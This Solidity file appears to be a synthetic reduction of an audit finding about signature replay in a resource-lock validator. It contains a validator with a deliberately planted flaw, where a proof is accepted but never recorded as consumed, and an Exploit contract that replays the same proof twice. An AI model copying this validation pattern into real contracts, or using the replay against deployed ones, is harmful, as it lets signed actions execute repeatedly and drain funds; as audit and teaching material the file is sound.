// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// Synthetic reduction of Etherspot ResourceLockValidator finding 61409.
/// The proof is checked but never consumed, so a higher EntryPoint nonce does
/// not stop the same signed resource-lock call data from executing again.
contract ResourceLockValidator {
    mapping(bytes32 => bool) public consumed;
    uint256 public validations;

    function validate(bytes32 proof, uint256 /*nonce*/) external returns (bool) {
        validations++;
        // @> VULN: proof is accepted without recording it as consumed.
        return proof != bytes32(0);
    }
}

contract LockedWallet {
    uint256 public executions;

    function execute(bytes32 /*callDataHash*/) external {
        executions++;
    }
}

contract Exploit {
    ResourceLockValidator public validator;
    LockedWallet public wallet;
    bytes32 public constant PROOF = keccak256("signed-resource-lock");
    bool public replayed;

    constructor() {
        validator = new ResourceLockValidator();
        wallet = new LockedWallet();
    }

    function run() external {
        require(validator.validate(PROOF, 0), "first validation");
        wallet.execute(PROOF);

        // EntryPoint's nonce is different, but the validator hashes only the
        // resource-lock call data and has no consumed-proof set.
        require(validator.validate(PROOF, 1), "replay validation");
        wallet.execute(PROOF);

        replayed = wallet.executions() == 2;
        require(replayed, "signature was not replayed");
    }
}
